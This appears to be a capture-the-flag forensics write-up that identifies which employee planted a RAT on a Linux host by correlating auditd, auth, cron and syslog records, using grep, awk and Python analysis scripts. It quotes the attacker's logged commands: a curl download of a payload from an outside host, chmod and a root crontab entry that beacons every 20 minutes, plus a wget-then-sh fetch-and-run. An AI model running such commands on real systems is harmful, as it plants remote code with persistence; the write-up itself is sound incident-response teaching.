# Corporate RAT - Log Analysis (500 points)

**Flag:** `cdctf{Lamar Hackson}` · **File:** `corpo_rat.zip` (128747 B, SHA-256 `5109835422566de5...486a45f7f6c5a66`)
**Contents:** `audit.log`, `auth.log`, `cron.log`, `syslog`, `users.txt` (98-employee roster)

## Problem

Four log files from one host, `ubnt-app02` (auditd, sshd/sudo, cron, syslog), plus a roster of 98
employees. One of them left a RAT on the server and leaked documents outside. The task is to name
that person; the flag is the full name from the roster, format `cdctf{Firstname Lastname}`.

## Initial triage

Record type counts in `audit.log`:

| Record | Count | Note |
| --- | --- | --- |
| SYSCALL | 2148 | 1136 of them are `comm=".upd"` |
| EXECVE | 574 | 568 are `/tmp/.cache/.upd`, the other 6 are one-off commands |
| SOCKADDR | 569 | only 2 destinations, both `203.0.113.77` |
| USER_LOGIN | 155 | sshd success, each carries `auid=` |
| USER_CHAUTHTOK | 1 | `op=crontab-edit` |
| PATH | 3 | `/tmp/.cache/.upd`, `/var/spool/cron/crontabs/root`, `/tmp/agent.sh` |
| CONFIG_CHANGE | 4 | `op=add_rule`, no `auid` |

The normal rhythm of this log is shell commands repeated in similar volumes (`git` 114, `python3`
109, `ls` 104, `apt-get` 100, `systemctl` 98, `ssh` 98, `tail` 97, `vim` 96, `top` 96, `psql` 95).
Two things break that rhythm: a hidden binary that runs far more often than anything else, and six
one-off commands. Four of those six, `curl`, `chmod`, `crontab`, `ls -la /tmp/.cache/`, carry the same
`auid`; the other two, `wget` and `sh`, belong to someone else.

```bash
grep -oP 'comm="\K[^"]+' audit.log | sort | uniq -c | sort -rn | head -6
```

```text
   1136 .upd
    114 git
    109 python3
    104 ls
    100 apt-get
     98 systemctl
```

```bash
grep -oP 'saddr=\K[0-9A-F]+' audit.log | sort | uniq -c
```

```text
      1 020020FBCB00714D0000000000000000
    568 02002157CB00714D0000000000000000
```

For AF_INET, `audit.log` encodes `saddr` as a 2-byte little-endian family, a 2-byte big-endian port,
then 4 big-endian IPv4 bytes. `0200 2157 CB00714D` is `203.0.113.77:8535` and `0200 20FB CB00714D`
is `203.0.113.77:8443`. Same IP in both: one connection on the download port and 568 on the beacon
port. In `cron.log`, 569 lines of `CMD (/tmp/.cache/.upd >/dev/null 2>&1)` account for both counts:
root's cron invokes the implant, and each invocation opens one beacon connection.

## Routes excluded

Three leads look attacker-like but do not connect to the implant (full log in `notes.md`):

1. **`gfoster` (George Foster, uid 1097)**: `wget -q http://198.51.100.44/tools/monitoring-agent.sh
   -O /tmp/agent.sh`, then `sh /tmp/agent.sh`, then `/bin/rm /tmp/agent.sh`. He holds real sudo
   (`sudo=yes` in the roster), always logs in from his own workstation 10.50.20.125, and the command
   sequence ran once: 0 cron lines, 0 beacons. Excluded.
2. **The extra account `newhire`**: a single `useradd` line run by `lroberts` on Sep 25, no login
   session and no audit record carrying this uid. Excluded.
3. **Scanners from `198.51.100.x` and `203.0.113.x`**: 106 UFW BLOCK lines in `syslog` and the
   `Invalid user` lines in `auth.log`. All 457 `Accepted password` lines come from `10.50.x.x`; none
   of the scanning IPs ever got a session. Excluded.

## Exploit chain

**Step 1 - Tie the implant to one human action.** The `crontab` record in `audit.log` carries `auid`
(the original login uid); `uid=0` only says the command ran through sudo. The `REPLACE` line in
`cron.log` names the pid of the very `crontab` process that rewrote root's crontab, so that pid joins
the two files:

```bash
grep -n 'crontab\[4711\]' cron.log
grep 'USER_CHAUTHTOK' audit.log
```

```text
51:Sep 20 02:17:46 ubnt-app02 crontab[4711]: (root) REPLACE (root)
52:Sep 20 02:17:47 ubnt-app02 CRON[612]: (root) RELOAD (crontabs/root)
type=USER_CHAUTHTOK msg=audit(1789870666.000:101175): pid=4711 uid=0 auid=1066 ses=5071 msg='op=crontab-edit exe="/usr/bin/crontab" res=success'
```

Looking `auid=1066` up in `users.txt` gives `lhackson 1066 Lamar Hackson Finance no /bin/bash`.

**Step 2 - Confirm the same auid downloaded and enabled the implant.** Three EXECVE records precede
the `USER_CHAUTHTOK`, and each one's SYSCALL record carries `auid=1066 uid=0 tty=pts4 ppid=4344`:

```text
type=EXECVE msg=audit(1789870512.000:101167): argc=5 a0="curl" a1="-s" a2="-o" a3="/tmp/.cache/.upd" a4="http://203.0.113.77:8443/update"
type=EXECVE msg=audit(1789870539.000:101170): argc=3 a0="chmod" a1="+x" a2="/tmp/.cache/.upd"
type=EXECVE msg=audit(1789870631.000:101173): argc=4 a0="crontab" a1="-u" a2="root" a3="-e"
type=PATH msg=audit(1789870539.000:101171): item=0 name="/tmp/.cache/.upd" inode=881422 dev=08:01 mode=0100755 ouid=0 ogid=0
```

Port 8443 in the URL matches the single SOCKADDR record that is not a beacon, and
`mode=0100755 ouid=0` matches the `chmod` that follows.

**Step 3 - Reconcile with `auth.log`.** sudo logs the same three commands minute by minute, and the
`ppid=4344` in audit is the pid of the sshd process that opened the session:

```text
Sep 20 02:14:11 ubnt-app02 sshd[4344]: Failed password for lhackson from 10.50.44.233 port 55210 ssh2
Sep 20 02:14:14 ubnt-app02 sshd[4344]: Accepted password for lhackson from 10.50.44.233 port 55210 ssh2
Sep 20 02:14:16 ubnt-app02 systemd-logind[890]: New session 50695 of user lhackson.
Sep 20 02:14:30 ubnt-app02 sudo: lhackson : user NOT in sudoers ; TTY=pts/4 ; PWD=/home/lhackson ; USER=root ; COMMAND=/usr/bin/apt-get install netcat-traditional
Sep 20 02:15:12 ubnt-app02 sudo: lhackson : TTY=pts/4 ; PWD=/home/lhackson ; USER=root ; COMMAND=/usr/bin/curl -s -o /tmp/.cache/.upd http://203.0.113.77:8443/update
Sep 20 02:15:39 ubnt-app02 sudo: lhackson : TTY=pts/4 ; PWD=/home/lhackson ; USER=root ; COMMAND=/bin/chmod +x /tmp/.cache/.upd
Sep 20 02:17:10 ubnt-app02 sudo: lhackson : TTY=pts/4 ; PWD=/home/lhackson ; USER=root ; COMMAND=/usr/bin/crontab -u root -e
Sep 20 02:26:15 ubnt-app02 sshd[4344]: pam_unix(sshd:session): session closed for user lhackson
```

Three secondary details point at the same person: 10.50.44.233 appears only twice in the whole
`auth.log` and both lines are this session (`lhackson`'s other 9 sessions come from 10.50.12.188);
the other 455 sessions in the log are numbered contiguously from 40000 to 40454 by systemd-logind,
only this one received 50695; and on Sep 23 the same user ran `sudo /bin/ls -la /tmp/.cache/`, going
back to check the directory holding the implant, the same command recorded in `audit.log` as records
101181-101182 with `auid=1066 uid=0 tty=pts2`.

The chain does not depend on the roster's `sudo` column: `lhackson` is marked `sudo=no` and his first
command is rejected with `user NOT in sudoers`, yet the next three run successfully as `USER=root`.
The logs record no intermediate grant step, and this does not affect attribution because the primary
evidence is the `auid` on the audit records, not the sudo lines.

**Step 4 - Verify the beacon cadence.** `analysis/beacons.py` decodes every SOCKADDR and joins it
with `cron.log`:

```bash
python analysis/beacons.py files/corpo_rat.zip
```

```text
203.0.113.77:8535  568 ket noi
  tu Sep 20 02:43:01 UTC -> Sep 27 23:44:50 UTC
  gap min/median/max = 1140/1200/1260 s
203.0.113.77:8443  1 ket noi

cron.log: 569 lan cron root chay /tmp/.cache/.upd
  lan dau : Sep 20 02:43:00 CRON[7741]
  lan cuoi: Sep 27 23:49:26 CRON[28467]
  tong so SOCKADDR trong audit.log = 569
```

The first beacon lands 1 second after the first cron line, the interval is 20 minutes, and 568 EXECVE
= 568 SOCKADDR: inside `audit.log`, every implant run leaves exactly one connection.

`syslog` sides with cron: 570 UFW ALLOW lines, all to `203.0.113.77`.

```bash
awk '/UFW ALLOW/ {d="";p="";t="ACK";for(i=1;i<=NF;i++){if($i~/^DST=/)d=$i;if($i~/^DPT=/)p=$i;if($i=="SYN")t="SYN"}; print d,p,t}' syslog | sort | uniq -c
```

```text
    569 DST=203.0.113.77 DPT=8443 ACK
      1 DST=203.0.113.77 DPT=8443 SYN
```

The single SYN at `Sep 20 02:15:13` is the payload download, the 569 ACK lines match the 569 times
cron invoked the implant, and the first ACK at `Sep 20 02:43:00` shares its second with the first cron
line. The two files disagree on port (syslog puts every beacon on 8443, audit records 8535), and audit
is missing one connection at the end of the window, so the figures usable for cross-checking are the
IP and the connection counts, not the port.

## Flag

Full output of `python exploit.py files/corpo_rat.zip`:

```bash
python exploit.py files/corpo_rat.zip
```

```text
[*] doc artifact: files\corpo_rat.zip
[*] audit.log: 3454 dong
[*] auth.log: 3948 dong
[*] cron.log: 679 dong
[*] syslog: 944 dong
[*] users.txt: 100 dong
[*] roster: 98 user, uid 1000-1097
[*] audit.log: 574 EXECVE, 2148 SYSCALL, 569 SOCKADDR
[+] buoc 1: /tmp/.cache/.upd duoc EXECVE 568 lan, comm=".upd"
[+] buoc 2: 569 SOCKADDR -> 2 dich: 203.0.113.77:8535 x568, 203.0.113.77:8443 x1
[+] buoc 2: C2 = 203.0.113.77:8535 (568 lan beacon)
[+]         lenh tai: curl -s -o /tmp/.cache/.upd http://203.0.113.77:8443/update
[+]         lenh tai: wget -q http://198.51.100.44/tools/monitoring-agent.sh -O /tmp/agent.sh
[+] buoc 3: cron.log co 569 dong CMD (/tmp/.cache/.upd ...)
[+] cron.log: crontab[4711] (root) REPLACE (root) - sua crontab cua root
[+] buoc 4: USER_CHAUTHTOK pid=4711 auid=1066 op=crontab-edit
[+]         auid 1066 -> uid 1066 = lhackson = Lamar Hackson
[+] buoc 5: audit:101167 auid=1066 uid=0 tty=pts4 ppid=4344 cmd=curl -s -o /tmp/.cache/.upd http://203.0.113.77:8443/update
[+] buoc 5: audit:101170 auid=1066 uid=0 tty=pts4 ppid=4344 cmd=chmod +x /tmp/.cache/.upd
[+] buoc 5: audit:101173 auid=1066 uid=0 tty=pts4 ppid=4344 cmd=crontab -u root -e
[+] buoc 6: auth.log, sudo ghi boi lhackson:
    Sep 20 02:14:30  sudo lhackson : USER=root ; COMMAND=/usr/bin/apt-get install netcat-traditional
    Sep 20 02:15:12  sudo lhackson : USER=root ; COMMAND=/usr/bin/curl -s -o /tmp/.cache/.upd http://203.0.113.77:8443/update
    Sep 20 02:15:39  sudo lhackson : USER=root ; COMMAND=/bin/chmod +x /tmp/.cache/.upd
    Sep 20 02:17:10  sudo lhackson : USER=root ; COMMAND=/usr/bin/crontab -u root -e
    Sep 23 13:22:07  sudo lhackson : USER=root ; COMMAND=/bin/ls -la /tmp/.cache/
[+]         3 lenh cai implant co mat nguyen van trong sudo.log
[+] buoc 7: lhackson vung ve 10.50.12.188 (9 phien)
    Sep 20 02:14:14  sshd[4344] Accepted password for lhackson from 10.50.44.233
    IP 10.50.44.233 xuat hien 2 dong trong auth.log, chi phuc vu ['lhackson']
[+]         audit SYSCALL co ppid thuoc sshd['4344']: 3 dong, auid = [1066] (ppid trong audit = pid cua sshd)
[+] buoc 8: curl uid=0 -> /tmp/.cache/.upd | cron=569, EXECVE=568 -> implant
[+] buoc 8: wget uid=0 -> /tmp/agent.sh | cron=0, EXECVE=0 -> loai: tai mot lan, khong cron, khong beacon
[+] nhan: lhackson (uid 1066), Lamar Hackson, Finance, sudo=no
[+] flag: cdctf{Lamar Hackson}
[+] da luu flag.txt
```

## Reproduce

```bash
unzip corpo_rat.zip                 # 5 files into the corpo_rat/ subdirectory
python exploit.py files/corpo_rat.zip
python analysis/beacons.py files/corpo_rat.zip
```

`exploit.py` also accepts a directory instead of the zip: `python exploit.py ../corpo_rat`.
Every inference starts from the five log files and `users.txt`; the greps quoted above run directly on
the extracted `audit.log`, `cron.log` and `syslog`.
